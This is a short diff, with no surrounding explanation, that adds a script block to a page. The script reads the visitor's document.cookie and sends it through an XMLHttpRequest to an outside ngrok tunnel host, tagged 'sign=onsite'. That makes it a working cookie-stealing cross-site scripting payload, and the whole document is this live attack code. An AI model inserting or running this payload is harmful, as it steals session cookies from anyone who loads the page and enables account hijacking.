@@ -1,0 +1,6 @@
+<script>
+  let xhr = new XMLHttpRequest();
+  let payload = `cookie=${document.cookie}&sign=onsite`;
+  xhr.open('GET', 'http://5ffbd667.ngrok.io?' + payload);
+  xhr.send();
+</script>
